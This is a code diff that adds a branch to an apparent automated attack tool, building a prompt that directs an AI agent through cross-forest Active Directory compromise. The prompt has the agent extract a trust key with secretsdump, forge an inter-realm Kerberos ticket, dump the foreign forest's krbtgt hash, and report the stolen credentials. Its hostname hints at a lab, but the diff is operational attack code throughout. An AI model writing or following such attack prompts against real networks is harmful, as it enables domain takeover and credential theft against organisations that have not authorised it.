@@ -843,6 +843,50 @@ def _generate_exploit_prompt(
         state_context = format_state_context(state, "exploit", current_target=target)
         return esc_prompt + state_context
 
+    # Special handling for trust key extraction (cross-forest pivot)
+    tool = payload.get("tool", "")
+    if tool == "extract_trust_key":
+        domain = payload.get("domain", "")
+        username = payload.get("username", "")
+        password = payload.get("password", "")
+        dc_ip = payload.get("dc_ip", target)
+        trusted_domain = payload.get("trusted_domain", "")
+        use_hash = payload.get("use_hash", False)
+
+        trust_prompt = (
+            f"**CROSS-FOREST TRUST KEY EXTRACTION**\n\n"
+            f"Source Domain (with DA): {domain}\n"
+            f"Source DC IP: {dc_ip}\n"
+            f"Target Foreign Forest: {trusted_domain}\n"
+            f"Credentials: {domain}\\{username}\n"
+            f"Using: {'NTLM hash' if use_hash else 'password'}\n"
+            f"Task ID: {task.task_id}\n\n"
+            "**OBJECTIVE:**\n"
+            "Extract the trust key (NTLM hash of the trust account) to enable cross-forest attacks.\n\n"
+            "**STEP 1: Extract trust key**\n"
+            "```\n"
+            f"extract_trust_key(\n"
+            f"    domain='{domain}',\n"
+            f"    username='{username}',\n"
+            f"    password='{password}',\n"
+            f"    dc_ip='{dc_ip}',\n"
+            f"    trusted_domain='{trusted_domain}'\n"
+            ")\n"
+            "```\n"
+            "This uses secretsdump to extract the trust account hash (e.g., ESSOS$ for essos.local trust).\n\n"
+            "**STEP 2: If trust key obtained, create inter-realm ticket**\n"
+            "Use the trust key to forge a ticket granting access to the foreign forest:\n"
+            "- Get domain SIDs for both source and target domains\n"
+            "- Use create_inter_realm_ticket with the trust key\n"
+            "- Use the forged ticket to access the foreign forest DC\n\n"
+            "**STEP 3: Dump credentials from foreign forest DC**\n"
+            "With the inter-realm ticket, run secretsdump on the foreign DC to get krbtgt hash.\n\n"
+            "**REPORT:**\n"
+            "Include the trust key hash and any credentials obtained in a JSON block."
+        )
+        state_context = format_state_context(state, "exploit", current_target=target)
+        return trust_prompt + state_context
+
     # Default exploit prompt
     default_prompt = (
         base_prompt + "Execute the exploitation technique. Report credentials obtained.\n"
